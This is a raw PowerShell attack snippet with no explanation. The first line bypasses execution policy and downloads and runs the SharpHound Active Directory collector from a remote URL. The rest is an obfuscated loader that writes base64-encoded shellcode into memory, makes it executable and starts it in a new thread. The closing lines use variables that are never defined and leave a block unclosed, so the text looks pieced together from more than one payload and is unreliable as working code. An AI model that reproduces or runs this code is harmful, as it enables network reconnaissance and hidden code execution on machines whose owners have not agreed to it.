powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"



Set-StrictMode -Version 2
$yeJUW = @"
        using System;
        using System.Runtime.InteropServices;
        namespace w_O {
                public class func {
                        [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
                        [Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
                        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                        [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
                        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                }
        }
"@

$as = New-Object Microsoft.CSharp.CSharpCodeProvider
$ijdWI = New-Object System.CodeDom.Compiler.CompilerParameters
$ijdWI.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$ijdWI.GenerateInMemory = $True
$aNIRQ = $as.CompileAssemblyFromSource($ijdWI, $yeJUW)

[Byte[]]$dUMu = [System.Convert]::FromBase64String("6ydbU1+wGPyudf1XWVNeigYwB0j/x0j/xmaBP7E1dAeAPhh16uvm/+Ho1P///wYEGPpMheD27MoEBgRHVUdUVFVQTDfWY0yNVmZMjVYeTI1WJkyNdlZJN81OC7FOTEw3xKo4Z3gEKCZFx80LRQfF5OlUTI1WJkVXj0Q4TgXWYod8Hg8EC4N2BgQGj4aMBgQGTIPEcmNOBdaPThxWQI1EJk0H1OVSTvvPSTfNR48yjE4F0Ew3xEfFzwmqRQfFPuRz9UoHSiAOQT/Vc9xeQI1EIk0H1GBFjQhOQI1EGk0H1EePAoxOBdZFXkVeWl9eR1xHXUdeTofqJEdW+eReRV9eTo8U7U37+ftbTDffVU24c29qb2pjcAZFUEyP5U/DxEhxIgH701dVTI/lVV5LNcZJN81VV0++PFJ/owYEBgT50e4cBgQGamtldilwaSh3Y2dzdmcpcmF1cChnaWkGXk6Nx03BxL0FBgRLNc9XVW4FV0++UY2ZwgYEBgT50e6kBgQGKz4xb1JTdWJsQWVXMH5uaEFeZjNOSHN3MmtIQ3FQbmRnRFR8PWIxNDNSYk5Ac3RlYlVhVmhVNGJjMUNvSE8zPkBDfVZLf3NnR2F+fmhKXm1mRHxRdHQ2fGdqUitHdndETV9yY1BcYHFiSGU/TV49REZFfHZBNnNUb05xfFZTZT5OTDxwYW1IfFtRST9wXEtNc0Jnfl1HTUkxSmh2SEhdBkyPxVVeR1xLNc9XTrwGNq6ABgQGBFZXVU3Bxu1RKD/50U6NwG4MW06N924ZXlRshjcGBE+N5m4CRV9NvHFAmoAEBgQG+9NJN8RVXk6N90k3zUs1z1dVTcHGKwIef/nRg8RzG07Dx4wVBAZNvED2MeYEBgQG+9NM+ctyBu2u7lEGBAZXX25GXk+N18XkFE/DxgQWBAZNvFyiV+MEBgQG+9NMlVdVTI/jTo33TI/eT8PGBCYEBk2P/U++FJKP5gYEBgT50U6HwiSDxHK2YI8BTAfHg8Rz1l7HXm4GXU/DxPSzplD707E1")
[Uint32]$vX = 0

$tI7p = [w_O.func]::VirtualAlloc(0, $dUMu.Length + 1, [w_O.func+AllocationType]::Reserve -bOr [w_O.func+AllocationType]::Commit, [w_O.func+MemoryProtection]::ReadWrite)
if ([Bool]!$tI7p) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($dUMu, 0, $tI7p, $dUMu.Length)

if ([w_O.func]::VirtualProtect($tI7p,[Uint32]$dUMu.Length + 1, [w_O.func+MemoryProtection]::Execute, [Ref]$vX) -eq $true ) {
        [IntPtr] $twUF = [w_O.func]::CreateThread(0,0,$tI7p,0,0,0)
        if ([Bool]!$twUF) { $global:result = 7; return }
        $oWYq = [w_O.func]::WaitForSingleObject($twUF, [w_O.func+Time]::Infinite)

[System.Runtime.InteropServices.Marshal]::Copy($OFMryOcQpBrL,0,$twVfsCCICfGWV,$OFMryOcQpBrL.Length)

$HLqxZvtXf::CreateThread(0,0,$twVfsCCICfGWV,0,0,0)
